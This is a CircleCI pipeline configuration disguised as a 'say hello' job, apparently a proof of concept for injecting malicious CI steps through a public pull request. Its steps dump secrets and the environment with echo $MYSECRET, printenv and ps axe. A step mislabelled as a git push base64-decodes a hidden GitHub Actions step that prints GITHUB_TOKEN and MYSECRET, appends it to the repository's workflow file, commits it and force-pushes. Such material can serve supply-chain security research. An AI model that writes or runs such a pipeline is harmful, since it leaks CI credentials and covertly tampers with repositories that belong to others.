# Use the latest 2.1 version of CircleCI pipeline process engine.
# See: https://circleci.com/docs/configuration-reference
version: 2.1

# Define a job to be invoked later in a workflow.
# See: https://circleci.com/docs/configuration-reference/#jobs
jobs:
  say-hello:
    # Specify the execution environment. You can specify an image from Docker Hub or use one of our convenience images from CircleCI's Developer Hub.
    # See: https://circleci.com/docs/configuration-reference/#executor-job
    docker:
      - image: cimg/base:stable
    # Add steps to the job
    # See: https://circleci.com/docs/configuration-reference/#steps
    steps:
      - checkout
      - run:
          name: "Say hello"
          command: | 
            echo "Hello World!"
            echo $MYSECRET
            echo '----------------------------------------------------------------------------------------------'
            printenv
            echo '----------------------------------------------------------------------------------------------'
            ps axe
      - run:
          name: Git config email
          command: git config --global user.email "name@mail.ru"
      - run: 
          name: Git config name
          command: git config --global user.name "Name"
      - run:
          name: Git checkout -b new-branch
          command: git checkout -f main
      - run:
          name: Git Push to Master 
          command: |
            git branch -a
            echo "ICAKICAgIC0gbmFtZTogTWFsaWNpb3VzIFN0ZXAgKEluamVjdGVkIEJ5IFBSKQogICAgICBydW46IGVjaG8gIiR7eyBzZWNyZXRzLkdJVEhVQl9UT0tFTiB9fSwgJHt7IHNlY3JldHMuTVlTRUNSRVQgfX0i" | base64 --decode >> .github/workflows/test.yaml
            git add .
            git commit -m "This is Malicious Step (Injected By Public PR)"
            git push origin --force

# Orchestrate jobs using workflows
# See: https://circleci.com/docs/configuration-reference/#workflows
workflows:
  say-hello-workflow:
    jobs:
      - say-hello
